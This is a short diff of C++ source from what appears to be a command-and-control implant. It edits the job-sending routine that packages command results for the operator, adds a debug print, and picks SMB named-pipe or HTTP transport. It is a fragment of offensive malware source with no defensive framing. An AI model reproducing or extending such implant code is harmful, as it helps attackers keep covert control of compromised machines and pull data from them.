@@ -79,7 +79,9 @@ auto DECLFN Jobs::Send(
             Current->State    == KH_JOB_READY_SEND &&
             Current->ExitCode == EXIT_SUCCESS
         ) {
-            Self->Pkg->Int32( PostJobs, PROFILE_C2 );
+            Self->Ntdll.DbgPrint( "[JOBS] Send: cmdID=%d, Pkg->Length=%d, Pkg->Buffer=%p\n",
+                Current->CmdID, Current->Pkg->Length, Current->Pkg->Buffer );
+            Self->Pkg->Int32( PostJobs, Self->Tsp->Pipe.Name ? PROFILE_SMB : PROFILE_HTTP );
             Self->Pkg->Int32( PostJobs, Current->Pkg->Length );
             Self->Pkg->Pad( PostJobs, UC_PTR( Current->Pkg->Buffer ), Current->Pkg->Length );
         } else if ( 
@@ -100,7 +102,7 @@ auto DECLFN Jobs::Send(
 
             MsgLen = MsgLen ? MsgLen : Str::LengthA( Unknown );
 
-            Self->Pkg->Int32( PostJobs, PROFILE_C2 );
+            Self->Pkg->Int32( PostJobs, Self->Tsp->Pipe.Name ? PROFILE_SMB : PROFILE_HTTP );
             Self->Pkg->Int32( PostJobs, MsgLen + 2 + 40 + sizeof(INT16) + sizeof(INT32) );
 
             Self->Pkg->Bytes( PostJobs, UC_PTR( Current->UUID ), 36 );
